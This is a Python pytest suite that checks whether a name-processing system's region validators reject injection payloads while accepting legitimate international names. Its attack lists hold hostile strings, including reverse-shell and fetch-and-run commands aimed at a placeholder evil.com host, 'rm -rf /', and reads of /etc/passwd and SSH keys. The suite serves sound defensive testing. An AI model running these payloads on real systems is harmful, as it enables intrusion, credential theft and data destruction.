#!/usr/bin/env python3
"""
V7 Comprehensive Security Testing Framework
Tests all security requirements from V7 specification against the REAL
per-processor security path of every region:

- Plain ``RegionSpec`` processors (the majority): security lives in
  ``security_validate_all_fields`` (src/regions/base.py), which routes
  through ``src/regions/security.py`` (``scan_for_attacks`` /
  ``secure_clean_name``) and raises ``RegionRuleError`` on threats.
- ``EnhancedRegionSpec`` processors (E2/E3/E5/E6 families, etc.):
  additionally expose ``apply_security_and_validation_checks`` (the V7
  comprehensive check in src/regions/base_enhanced.py). They also
  inherit the ``RegionSpec`` path above; both are exercised.
- ``E4KoreanProcessor`` duck-types the processor interface without
  subclassing ``RegionSpec``; its security gate lives in ``validate()``,
  which delegates to the core ``SecurityValidator`` and raises
  ``ValueError``.

The old version of this file called
``apply_security_and_validation_checks`` on every processor, an API that
only ``EnhancedRegionSpec`` subclasses have — plain ``RegionSpec``
processors raised ``AttributeError`` and the suite could never run.
"""

import os
import sys
from pathlib import Path
from typing import Any, Dict, List

import pytest

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

os.environ["GMNAP_TEST_MODE"] = "true"

from src.regions.base import RegionRuleError  # noqa: E402
from src.regions.manager_optimized import RegionManager  # noqa: E402


class TestV7SecurityFramework:
    """
    Comprehensive security testing framework for V7 compliance
    Tests all regions against V7 security requirements:
    - SQL injection prevention
    - XSS protection
    - Command injection prevention
    - DoS protection (input length limits)
    - Template injection prevention
    - LDAP injection prevention
    - Path traversal prevention
    """

    @classmethod
    def setup_class(cls):
        """Setup region manager for testing"""
        config_path = project_root / "config"
        cls.manager = RegionManager(config_path)

        # Load all 33 regions for testing
        cls.region_codes = [
            "A1",
            "A2",
            "A3",
            "A4",
            "A5",
            "B1",
            "B2",
            "B3",
            "C1",
            "C2",
            "C3",
            "C4",
            "C5",
            "C6",
            "C7",
            "C8",
            "C9",
            "D1",
            "D2",
            "D3",
            "D4",
            "D5",
            "E1",
            "E2",
            "E3",
            "E4",
            "E5",
            "E6",
            "E7",
            "F1",
            "F2",
            "F3",
            "G1",
        ]

        # Load regions
        cls.regions = {}
        for code in cls.region_codes:
            try:
                region = cls.manager.get_region(code)
                if region is not None:
                    cls.regions[code] = region
                else:
                    print(f"Warning: Region {code} returned None")
            except Exception as e:
                print(f"Warning: Failed to load region {code}: {e}")

        print(
            f"Successfully loaded {len(cls.regions)} regions: {list(cls.regions.keys())}"
        )

    # ------------------------------------------------------------------
    # Per-processor security dispatch
    # ------------------------------------------------------------------
    def _security_check(self, region, name: str) -> None:
        """Run *the region's own* security path on a single name.

        Raises RegionRuleError if the input is rejected as malicious
        (whatever the processor's native rejection exception is, it is
        normalized to RegionRuleError so the assertions below can count
        blocks uniformly).
        """
        entry = {"CanonicalLatin": name, "GlobalID": "test"}

        if hasattr(region, "apply_security_and_validation_checks"):
            # EnhancedRegionSpec: V7 comprehensive check (150-char
            # limit, SQL/XSS/LDAP/template/NoSQL/JNDI/CRLF patterns).
            region.apply_security_and_validation_checks(dict(entry))

        if hasattr(region, "security_validate_all_fields"):
            # RegionSpec (plain AND enhanced): routes through
            # src/regions/security.py scan_for_attacks/secure_clean_name.
            region.security_validate_all_fields(entry)
        else:
            # E4KoreanProcessor: duck-typed processor whose security
            # gate is validate() -> core SecurityValidator, raising
            # ValueError on malicious or out-of-policy input.
            try:
                region.validate(dict(entry))
            except ValueError as exc:
                raise RegionRuleError(f"E4 rejection: {exc}") from exc

    # SQL Injection Tests

    @pytest.mark.timeout(60)
    def test_sql_injection_prevention(self):
        """Test SQL injection attack prevention across all regions"""
        sql_attacks = [
            "Robert'; DROP TABLE users; --",
            "Smith' OR '1'='1",
            "Johnson' UNION SELECT * FROM admin",
            "Brown'; INSERT INTO users VALUES('admin','pass'); --",
            "Davis' AND 1=1 --",
            "Wilson' OR 1=1 #",
            "Miller'; UPDATE users SET password='hacked' WHERE id=1; --",
            "Moore' HAVING 1=1 --",
            "Taylor' GROUP BY 1 --",
            "Anderson' ORDER BY 1 --",
        ]

        results = self._test_attacks_across_regions(sql_attacks, "SQL injection")

        # Should block all SQL injection attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"SQL injection tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_xss_prevention(self):
        """Test XSS attack prevention across all regions"""
        xss_attacks = [
            "John<script>alert('xss')</script>",
            "Jane<iframe src='evil.com'></iframe>",
            "Bob<img src=x onerror=alert('xss')>",
            "Alice<div onclick='alert()'>Name</div>",
            "Charlie<a href='javascript:alert()'>Link</a>",
            "David<body onload='alert()'>",
            "Eva<svg/onload=alert('xss')>",
            "Frank<input onfocus=alert('xss') autofocus>",
            "Grace<marquee onstart=alert('xss')>",
            "Henry<style>@import 'javascript:alert()'</style>",
        ]

        results = self._test_attacks_across_regions(xss_attacks, "XSS")

        # Should block all XSS attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"XSS tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_command_injection_prevention(self):
        """Test command injection attack prevention across all regions"""
        cmd_attacks = [
            "Smith; rm -rf /",
            "Johnson && sudo su",
            "Brown | cat /etc/passwd",
            "Davis $(whoami)",
            "Wilson `uname -a`",
            "Miller; wget evil.com/shell.sh | sh",
            "Moore & nc -e /bin/bash evil.com 1337",
            "Taylor; curl evil.com | sudo bash",
            "Anderson $(curl -s evil.com/payload)",
            "Thomas `cat /proc/version`",
        ]

        results = self._test_attacks_across_regions(cmd_attacks, "command injection")

        # Should block all command injection attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"Command injection tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_dos_protection(self):
        """Test DoS protection via length limits.

        The actual per-path limits are: 150 chars in the
        EnhancedRegionSpec comprehensive check (V7 spec), 500 chars
        total in src/regions/security.py for plain RegionSpec
        processors (which also rejects >50 repetitions of a single
        character, catching the classic padding payloads far earlier),
        and 100 chars in E4's Korean-specific validate().
        """
        # A *varied* at-limit name; an all-"A" string is rejected by
        # the repetition guard, which is a different (legitimate) block.
        at_limit_150 = "".join(chr(ord("A") + i % 26) for i in range(150))
        at_limit_e4 = "".join(chr(ord("A") + i % 26) for i in range(90))

        # DoS-style payloads: classic single-char padding at increasing
        # sizes, plus a varied >500-char string that only the length
        # limit (not the repetition guard) can catch.
        over_limit_names = [
            "A" * 151,  # Just over the V7 150 limit
            "B" * 200,  # Moderately over
            "C" * 500,  # Way over limit
            "D" * 1000,  # Extreme length
            "E" * 2000,  # DoS-level length
            "".join(chr(ord("a") + i % 26) for i in range(501)),  # varied, >500
        ]

        # A reasonable long-but-valid name must pass every region
        for region_code, region in self.regions.items():
            valid_name = (
                at_limit_150
                if hasattr(region, "security_validate_all_fields")
                else at_limit_e4  # E4 caps Korean names at 100 chars
            )
            try:
                self._security_check(region, valid_name)
            except RegionRuleError as e:
                pytest.fail(f"Region {region_code} rejected valid at-limit name: {e}")

        # Over-limit / DoS payloads must be blocked everywhere
        blocked_count = 0
        total_tests = len(over_limit_names) * len(self.regions)

        for region_code, region in self.regions.items():
            for name in over_limit_names:
                try:
                    self._security_check(region, name)
                    # Should not reach here
                except RegionRuleError:
                    blocked_count += 1

        block_rate = blocked_count / total_tests
        assert (
            block_rate == 1.0
        ), f"DoS protection failed: {block_rate:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_template_injection_prevention(self):
        """Test template injection attack prevention"""
        template_attacks = [
            "Smith{{7*7}}",
            "Johnson<%=system('whoami')%>",
            "Brown${java.lang.Runtime.exec('whoami')}",
            "Davis#{7*7}",
            "Wilson*{user.name}",
            "Miller@{/admin/users}",
            "Moore~{fragments::header}",
            "Taylor{{config.SECRET_KEY}}",
            "Anderson<%eval request['cmd']%>",
            "Thomas${T(java.lang.System).exit(1)}",
        ]

        results = self._test_attacks_across_regions(
            template_attacks, "template injection"
        )

        # Should block all template injection attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"Template injection tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_ldap_injection_prevention(self):
        """Test LDAP injection attack prevention"""
        ldap_attacks = [
            "Smith*)(uid=*",
            "Johnson)(&(uid=admin)(pwd=*))",
            "Brown*)(|(uid=*))",
            "Davis*)(cn=*)",
            "Wilson)(mail=*@evil.com",
            "Miller*)(userPassword=*)",
            "Moore)(!(&(uid=admin)))",
            "Taylor*)(objectClass=*)",
            "Anderson)(|(cn=admin)(cn=root))",
            "Thomas*)(description=*admin*)",
        ]

        results = self._test_attacks_across_regions(ldap_attacks, "LDAP injection")

        # Should block all LDAP injection attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"LDAP injection tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        path_attacks = [
            "Smith../../../etc/passwd",
            "Johnson..\\..\\windows\\system32",
            "Brown/etc/shadow",
            "Davis\\windows\\system32\\config\\sam",
            "Wilson/proc/self/environ",
            "Miller/sys/class/net",
            "Moore../../../root/.ssh/id_rsa",
            "Taylor..\\..\\boot.ini",
            "Anderson/etc/hosts",
            "Thomas/proc/version",
        ]

        results = self._test_attacks_across_regions(path_attacks, "path traversal")

        # Should block all path traversal attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"Path traversal tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_unicode_security_bypass_attempts(self):
        """Test Unicode-based security bypass attempts"""
        unicode_attacks = [
            "Smith․DROP TABLE users",  # One dot leader
            "Johnson OR 1=1",  # Non-breaking space
            "Brown <script>",  # Line separator
            "Davis alert()",  # Paragraph separator
            "Wilson﻿'; --",  # Zero width no-break space
            "Miller‎<iframe>",  # Left-to-right mark
            "Moore‮>tpircs<",  # Right-to-left override
            "Taylor‌$(whoami)",  # Zero width non-joiner
            "Anderson‍{{7*7}}",  # Zero width joiner
            "Thomas⁠*)(uid=*",  # Word joiner
        ]

        results = self._test_attacks_across_regions(unicode_attacks, "Unicode bypass")

        # Should block most Unicode bypass attempts
        # Allow some leeway since some regions may handle Unicode differently
        assert (
            results["blocked_rate"] >= 0.8
        ), f"Unicode bypass tests failed: {results['blocked_rate']:.1%} blocked, expected >=80%"

    @pytest.mark.timeout(60)
    def test_mixed_attack_vectors(self):
        """Test combinations of multiple attack vectors"""
        mixed_attacks = [
            "Smith'; <script>alert('xss')</script> --",
            "Johnson $(curl evil.com | sh) {{7*7}}",
            "Brown OR 1=1 -- <iframe src=evil>",
            "Davis ../../../etc/passwd && rm -rf /",
            "Wilson *)(uid=admin'; DROP TABLE users; --",
            "Miller {{config.SECRET}} $(whoami) OR 1=1",
            "Moore <script>$(curl evil.com)</script>",
            "Taylor '; {{7*7}} <iframe> ../../../etc/shadow",
            "Anderson OR 1=1 -- *)(cn=*) <script>",
            "Thomas $(whoami) {{7*7}} OR 1=1 --",
        ]

        results = self._test_attacks_across_regions(mixed_attacks, "mixed attacks")

        # Should block all mixed attack attempts
        assert (
            results["total_blocked"] == results["total_tests"]
        ), f"Mixed attack tests failed: {results['blocked_rate']:.1%} blocked, expected 100%"

    @pytest.mark.timeout(60)
    def test_legitimate_names_not_blocked(self):
        """Test that legitimate names are not incorrectly blocked"""
        legitimate_names = [
            "Smith, John",
            "García, María José",
            "O'Connor, Seán",
            "van der Berg, Johannes",
            "al-Rashid, Muhammad",
            "李明, Li Ming",
            "山田太郎, Yamada Taro",
            "김민준, Kim Min-jun",
            "Müller, Hans-Peter",
            "Johansson, Erik Lars",
            "Rossi, Giovanni Carlo",
            "Dupont, Jean-Baptiste",
            "Andersson, Anna-Maria",
            "Petrov, Ivan Dmitrievich",
            "Nakamura, Hiroshi",
            "Chen, Wei-Ming",
            "Park, Sung-Ho",
            "Nguyen, Minh Duc",
            "Thompson, Mary Elizabeth",
            "Rodriguez, Carlos Alberto",
        ]

        blocked = []
        total_tests = len(legitimate_names) * len(self.regions)

        for region_code, region in self.regions.items():
            for name in legitimate_names:
                try:
                    self._security_check(region, name)
                    # Should not raise exception
                except RegionRuleError as e:
                    blocked.append((region_code, name, str(e)))

        # Should allow all legitimate names
        block_rate = len(blocked) / total_tests
        assert block_rate == 0.0, (
            f"Legitimate names incorrectly blocked: {block_rate:.1%} blocked, "
            f"expected 0%. First blocks: {blocked[:5]}"
        )

    @pytest.mark.timeout(60)
    def test_edge_case_security_scenarios(self):
        """Test security edge cases and boundary conditions"""
        edge_cases = [
            "",  # Empty string
            " ",  # Single space
            "\t",  # Single tab
            "\n",  # Single newline
            "\r",  # Single carriage return
            "A",  # Single character
            "AB",  # Two characters
            "A" * 149,  # Just under V7 limit (trips the repetition guard)
            "A" * 150,  # Exactly at V7 limit (trips the repetition guard)
        ]

        # These should all be handled gracefully (not crash)
        for region_code, region in self.regions.items():
            for case in edge_cases:
                try:
                    self._security_check(region, case)
                    # May or may not raise exception, but should not crash
                except (RegionRuleError, ValueError):
                    # Expected for some edge cases
                    pass
                except Exception as e:
                    pytest.fail(
                        f"Region {region_code} crashed on edge case '{repr(case)}': {e}"
                    )

    def _test_attacks_across_regions(
        self, attacks: List[str], attack_type: str
    ) -> Dict[str, Any]:
        """Helper to test attack vectors across all regions"""
        blocked_count = 0
        total_tests = len(attacks) * len(self.regions)
        failed = []

        for region_code, region in self.regions.items():
            for attack in attacks:
                try:
                    self._security_check(region, attack)
                    # Attack was not blocked
                    failed.append((region_code, attack))
                except RegionRuleError:
                    # Attack was blocked (good)
                    blocked_count += 1

        blocked_rate = blocked_count / total_tests
        if failed:
            print(f"\n{attack_type}: {len(failed)} unblocked, e.g. {failed[:5]}")

        return {
            "attack_type": attack_type,
            "total_tests": total_tests,
            "total_blocked": blocked_count,
            "blocked_rate": blocked_rate,
            "failed_regions": {code for code, _ in failed},
        }

    @pytest.mark.timeout(60)
    def test_security_performance_impact(self):
        """Test that security checks don't severely impact performance"""
        import time

        test_name = "Performance Test Name"

        # Test performance across all regions
        total_time = 0
        iterations = 100

        for region_code, region in self.regions.items():
            start_time = time.time()

            for _ in range(iterations):
                try:
                    self._security_check(region, test_name)
                except RegionRuleError:
                    pass  # Expected for some regions

            region_time = time.time() - start_time
            total_time += region_time

        # Should complete all security checks in reasonable time
        avg_time_per_check = total_time / (len(self.regions) * iterations)

        # Security checks should be very fast (< 1ms per check)
        assert (
            avg_time_per_check < 0.001
        ), f"Security checks too slow: {avg_time_per_check:.3f}s per check (expected < 1ms)"

    @pytest.mark.timeout(60)
    def test_comprehensive_security_report(self):
        """Generate comprehensive security test report"""
        report = {
            "total_regions_tested": len(self.regions),
            "security_features_tested": [
                "SQL injection prevention",
                "XSS prevention",
                "Command injection prevention",
                "DoS protection (length limits)",
                "Template injection prevention",
                "LDAP injection prevention",
                "Path traversal prevention",
                "Unicode bypass prevention",
                "Mixed attack vector prevention",
                "Legitimate name allowance",
                "Edge case handling",
                "Performance impact",
            ],
        }

        # This test always passes - it's for reporting
        print("\n" + "=" * 80)
        print("V7 COMPREHENSIVE SECURITY TEST REPORT")
        print("=" * 80)
        print(f"Regions tested: {report['total_regions_tested']}")
        print(f"Security features tested: {len(report['security_features_tested'])}")
        print("\nSecurity features covered:")
        for feature in report["security_features_tested"]:
            print(f"  ✓ {feature}")
        print("=" * 80)

        assert True  # Always pass - this is a reporting test


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
